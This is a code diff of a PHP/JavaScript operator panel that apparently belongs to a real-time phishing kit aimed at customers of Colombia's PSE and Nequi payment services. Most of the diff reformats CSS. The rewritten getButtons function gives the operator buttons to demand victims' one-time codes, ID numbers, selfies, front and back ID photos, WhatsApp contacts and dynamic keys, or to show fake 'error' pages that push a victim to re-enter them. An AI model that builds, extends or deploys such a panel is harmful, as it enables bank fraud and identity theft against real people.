@@ -324,6 +324,7 @@ require_once __DIR__ . '/auth.php';
             color: #111;
             transition: 0.1s;
         }
+
         .btn-act:active {
             transform: scale(0.97);
         }
@@ -340,6 +341,7 @@ require_once __DIR__ . '/auth.php';
             gap: 8px;
             margin-bottom: 8px;
         }
+
         .btn-expand {
             width: 100%;
             background: transparent;
@@ -351,13 +353,18 @@ require_once __DIR__ . '/auth.php';
             font-size: 0.8rem;
             transition: 0.2s;
         }
-        .btn-expand:hover { border-color: #666; color: #ccc; }
+
+        .btn-expand:hover {
+            border-color: #666;
+            color: #ccc;
+        }
 
         .action-category {
             margin-bottom: 12px;
             border-top: 1px solid #333;
             padding-top: 8px;
         }
+
         .cat-title {
             display: block;
             font-size: 0.7rem;
@@ -366,11 +373,13 @@ require_once __DIR__ . '/auth.php';
             text-transform: uppercase;
             font-weight: 700;
         }
+
         .btn-grid-mini {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(60px, 1fr));
             gap: 6px;
         }
+
         .btn-mini {
             padding: 6px 4px;
             font-size: 0.7rem;
@@ -380,11 +389,26 @@ require_once __DIR__ . '/auth.php';
             color: #fff;
             font-weight: 600;
         }
+
         /* Specific mini colors */
-        .act-whats { background: #22c55e; color: #000; }
-        .act-sel { background: #8b5cf6; }
-        .act-doc { background: #a855f7; }
-        .act-dyn { background: #f59e0b; color: #000; }
+        .act-whats {
+            background: #22c55e;
+            color: #000;
+        }
+
+        .act-sel {
+            background: #8b5cf6;
+        }
+
+        .act-doc {
+            background: #a855f7;
+        }
+
+        .act-dyn {
+            background: #f59e0b;
+            color: #000;
+        }
+
         .act-err {
             background: #f87171;
         }
@@ -684,22 +708,72 @@ require_once __DIR__ . '/auth.php';
         }
 
         // --- BUTTONS BUILDER NEW DESIGN ---
+        // --- BUTTONS BUILDER NEW DESIGN ---
         function getButtons(id, type) {
             let b = '';
-            b += `<button class="btn-act act-doc" onclick="act(${id},'pse',11)">Doc Frente</button>`;
-            b += `<button class="btn-act act-doc" onclick="act(${id},'pse',12)">Doc Reverso</button>`;
-            // Doc Errors
-            b += `<button class="btn-act act-err" onclick="act(${id},'pse',13)">Err Doc F.</button>`;
-            b += `<button class="btn-act act-err" onclick="act(${id},'pse',14)">Err Doc R.</button>`;
 
-            // Dinamica
-            b += `<button class="btn-act act-dyn" onclick="act(${id},'pse',15)">Reloj</button>`;
-            b += `<button class="btn-act act-err" onclick="act(${id},'pse',16)">Err Reloj</button>`;
+            // Primary Actions (Always Visible)
+            b += `<div class="btn-group-primary">`;
+            if (type === 'nequi') {
+                b += `<button class="btn-act act-otp" onclick="act(${id},'nequi',3)">Pedir OTP</button>`;
+                b += `<button class="btn-act act-fin" onclick="act(${id},'nequi',0)">Finalizar</button>`;
+            } else {
+                b += `<button class="btn-act act-otp" onclick="act(${id},'pse',3)">Pedir OTP</button>`;
+                b += `<button class="btn-act act-cc" onclick="act(${id},'pse',5)">Pedir CC</button>`;
+                b += `<button class="btn-act act-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
+            }
+            b += `</div>`;
 
-            // Finish
-            b += `<button class="btn-act act-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
+            // Toggle Trigger
+            b += `<button class="btn-expand" onclick="toggleActions(this)">
+                    <i class="fas fa-chevron-down"></i> Más Opciones / Reportar Errores
+                  </button>`;
+
+            // Hidden Secondary Actions
+            b += `<div class="actions-hidden" style="display:none; margin-top:10px;">`;
+
+            // 1. Errors Section
+            b += `<div class="action-category"><span class="cat-title">⚠️ Errores</span><div class="btn-grid-mini">`;
+            if (type === 'nequi') {
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'nequi',2)">Login</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'nequi',4)">OTP</button>`;
+            } else {
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',2)">Login</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',4)">OTP</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',6)">CC</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',10)">Selfie</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',13)">Doc F.</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',14)">Doc R.</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',16)">Reloj</button>`;
+            }
+            b += `</div></div>`;
+
+            // 2. Extra Requests
+            if (type !== 'nequi') {
+                b += `<div class="action-category"><span class="cat-title">📡 Solicitar</span><div class="btn-grid-mini">`;
+                b += `<button class="btn-mini act-whats" onclick="act(${id},'pse',8)">WhatsApp</button>`;
+                b += `<button class="btn-mini act-sel" onclick="act(${id},'pse',9)">Selfie</button>`;
+                b += `<button class="btn-mini act-doc" onclick="act(${id},'pse',11)">Doc F.</button>`;
+                b += `<button class="btn-mini act-doc" onclick="act(${id},'pse',12)">Doc R.</button>`;
+                b += `<button class="btn-mini act-dyn" onclick="act(${id},'pse',15)">Reloj</button>`;
+                b += `</div></div>`;
+            }
+
+            b += `</div>`; // End hidden
+            return b;
         }
-        return b;
+
+        function toggleActions(btn) {
+            const container = btn.nextElementSibling;
+            if (container.style.display === 'none') {
+                container.style.display = 'block';
+                btn.innerHTML = '<i class="fas fa-chevron-up"></i> Menos Opciones';
+                btn.style.background = '#333';
+            } else {
+                container.style.display = 'none';
+                btn.innerHTML = '<i class="fas fa-chevron-down"></i> Más Opciones / Reportar Errores';
+                btn.style.background = 'transparent';
+            }
         }
 
         // --- ACTIONS ---
